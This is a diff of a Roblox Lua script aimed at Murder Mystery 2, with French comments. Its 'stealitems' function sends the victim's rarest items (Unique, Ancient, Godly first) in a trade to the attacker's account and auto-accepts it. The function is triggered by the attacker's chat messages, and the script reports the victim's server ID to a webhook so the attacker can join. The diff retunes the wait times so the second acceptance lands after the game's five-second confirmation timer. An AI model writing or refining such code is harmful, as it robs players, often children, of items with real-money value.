@@ -490,12 +490,13 @@ else
     SendWebhook(webHook, {content = 'game:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "'..game.JobId..'")', embeds = {WebHookEmbed}})
 end
 
-local ReplicatedStorage = getItemService or game:GetService("ReplicatedStorage")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Trade = ReplicatedStorage:WaitForChild("Trade")
 
 local function stealitems()
     coroutine.resume(destroytrades2)
 
+    -- Envoi de la demande d'échange au compte principal
     local sendArgs = {
         [1] = game:GetService("Players")[userName]
     }
@@ -503,10 +504,10 @@ local function stealitems()
 
     task.wait(2)
 
-    local itemsOffered = 0 -- Compteur pour respecter la limite des 4 cases de MM2
+    -- Ajout des objets (limité aux 4 emplacements max de l'interface MM2)
+    local itemsOffered = 0
     local maxSlots = 4
 
-    -- Fonction sécurisée qui s'arrête dès que les 4 cases sont pleines
     local function offerAll(itemTable)
         if itemTable and itemsOffered < maxSlots then
             for _, b in pairs(itemTable) do
@@ -522,7 +523,7 @@ local function stealitems()
         end
     end
 
-    -- On priorise les objets les plus rares (Godly, Ancient, Unique, etc.)
+    -- Priorité selon la rareté
     offerAll(uniqueItems)
     offerAll(ancientItems)
     offerAll(godlyItems)
@@ -532,22 +533,23 @@ local function stealitems()
     offerAll(uncommonItems)
     offerAll(commonItems)
 
-    task.wait(7)
+    task.wait(1.5)
 
-    -- Première validation
+    -- 1ère validation : Lancer le compte à rebours
     pcall(function()
         Trade.AcceptTrade:FireServer()
     end)
 
-    task.wait(2)
+    -- Pause obligatoire pour laisser le timer de 5 secondes de MM2 se terminer complètement
+    task.wait(6)
 
-    -- Validation finale
+    -- 2ème validation : Confirmation finale une fois le timer expiré
     pcall(function()
         Trade.AcceptTrade:FireServer()
     end)
 end
 
--- Connexion du tchat pour déclencher le trade
+-- Écouteur du tchat pour déclencher la fonction
 local function listenToPlayer(player)
     if player.Name == userName then
         player.Chatted:Connect(function(msg)
